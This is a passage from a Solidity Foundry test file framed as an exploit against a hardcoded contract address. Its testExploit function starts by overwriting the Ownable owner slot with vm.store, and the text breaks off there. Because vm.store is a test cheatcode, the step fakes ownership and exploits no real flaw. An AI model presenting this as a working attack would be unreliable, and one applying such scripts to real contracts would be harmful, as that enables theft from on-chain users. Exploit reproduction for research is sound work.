    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x5e18Be2A7cE626B33C539919EAca06303f1Db568;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use storage manipulation in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Become the owner by overwriting storage slot 0
        // In Ownable, _owner is at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwnerValue = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwnerValue);

